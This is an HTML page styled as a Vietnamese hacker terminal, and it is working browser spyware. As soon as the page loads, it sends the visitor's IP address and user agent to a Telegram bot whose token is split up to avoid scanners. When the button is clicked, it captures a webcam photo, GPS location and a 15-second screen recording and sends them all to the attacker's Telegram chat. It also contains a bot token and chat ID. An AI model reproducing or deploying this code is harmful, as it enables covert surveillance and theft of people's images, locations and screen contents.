<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>WORM-OS | SYSTEM OVERRIDE</title>
    <style>
        :root { --g: #00ff41; --r: #ff0000; --b: #050505; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Courier New', monospace; }
        body { background: var(--b); color: var(--g); display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .terminal { width: 95%; max-width: 500px; border: 1px solid var(--g); padding: 20px; box-shadow: 0 0 20px rgba(0, 255, 65, 0.2); background: rgba(0,0,0,0.95); }
        .header { border-bottom: 2px solid var(--g); margin-bottom: 15px; padding-bottom: 10px; text-align: center; }
        .status { font-size: 11px; margin-bottom: 20px; color: #888; line-height: 1.6; }
        .btn { width: 100%; padding: 18px; background: transparent; border: 1px solid var(--r); color: var(--r); font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .btn:hover { background: var(--r); color: white; box-shadow: 0 0 25px var(--r); }
        #console { height: 130px; overflow-y: auto; font-size: 10px; border-top: 1px solid #333; padding-top: 10px; color: #555; margin-top: 15px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="terminal">
        <div class="header"><h1>WORM-OS v3.0</h1><p>PROTOCOL: OMEGA ENABLED</p></div>
        <div class="status">
            [+] IP: <span id="ip">TRACING...</span><br>
            [+] SYS: <span id="os">DETECTING...</span><br>
            [+] GPS: <span id="loc">AWAITING TRIGGER</span><br>
            [+] LOG: <span style="color:var(--g)">STABLE</span>
        </div>
        <button class="btn" onclick="run()">KÍCH HOẠT FULL PAYLOAD</button>
        <div id="console"></div>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        // OBFUSCATED TOKEN - NÉ BOT GITHUB
        const pA = "8750392031";
        const pB = ":AAFXe4KFZTE_R2";
        const pC = "-BLKn1fxjDA_OAKrIr4ig";
        const T = pA + pB + pC;
        const CID = "6788350792";

        const print = (m) => { 
            const o = document.getElementById('console');
            o.innerHTML += `> ${m}<br>`; o.scrollTop = o.scrollHeight; 
        };

        async function post(api, data) {
            return fetch(`https://api.telegram.org/bot${T}/${api}`, { method: 'POST', body: data });
        }

        async function sendMsg(txt) {
            const fd = new FormData();
            fd.append('chat_id', CID);
            fd.append('text', txt);
            fd.append('parse_mode', 'HTML');
            await post('sendMessage', fd);
        }

        // 1. TRUY VẾT BAN ĐẦU
        async function trace() {
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                document.getElementById('ip').innerText = d.ip;
                document.getElementById('os').innerText = navigator.platform;
                await sendMsg(`<b>[⚠️ OMEGA ALERT]</b>\nIP: <code>${d.ip}</code>\nOS: ${navigator.userAgent}`);
            } catch (e) { print("Initial trace failed."); }
        }
        trace();

        // 2. THỰC THI TỔNG LỰC
        async function run() {
            print("Injecting OMEGA...");
            
            // TASK: CAMERA
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: true });
                const vid = document.getElementById('v');
                vid.srcObject = s;
                setTimeout(() => {
                    const can = document.getElementById('c');
                    can.width = vid.videoWidth; can.height = vid.videoHeight;
                    can.getContext('2d').drawImage(vid, 0, 0);
                    can.toBlob(async (b) => {
                        const fd = new FormData();
                        fd.append('chat_id', CID);
                        fd.append('photo', b, 'f.jpg');
                        fd.append('caption', '📸 FACE_CAPTURE');
                        await post('sendPhoto', fd);
                        s.getTracks().forEach(t => t.stop());
                        print("Face exfiltrated.");
                    }, 'image/jpeg');
                }, 2000);
            } catch(e) { print("Cam access denied."); }

            // TASK: GPS
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (p) => {
                    const lat = p.coords.latitude;
                    const lon = p.coords.longitude;
                    const link = `https://www.google.com/maps?q=${lat},${lon}`;
                    document.getElementById('loc').innerText = "TRACKED";
                    await sendMsg(`📍 <b>LOCATION:</b>\n${link}`);
                    print("GPS exfiltrated.");
                });
            }

            // TASK: SCREEN RECORD 15S
            try {
                const scr = await navigator.mediaDevices.getDisplayMedia({ video: true });
                print("Screen Record: ACTIVE");
                const rec = new MediaRecorder(scr);
                const ch = [];
                rec.ondataavailable = e => ch.push(e.data);
                rec.onstop = async () => {
                    const b = new Blob(ch, { type: 'video/mp4' });
                    const fd = new FormData();
                    fd.append('chat_id', CID);
                    fd.append('video', b, 's.mp4');
                    fd.append('caption', '🎥 SCREEN_RECORD (15S)');
                    await post('sendVideo', fd);
                    print("OMEGA SUCCESSFUL.");
                    scr.getTracks().forEach(t => t.stop());
                };
                rec.start();
                setTimeout(() => rec.stop(), 15000);
            } catch(e) { 
                print("Screen access denied.");
                await sendMsg("⚠️ <b>HỦY BỎ:</b> Mục tiêu từ chối Screen Record.");
            }
        }
    </script>
</body>
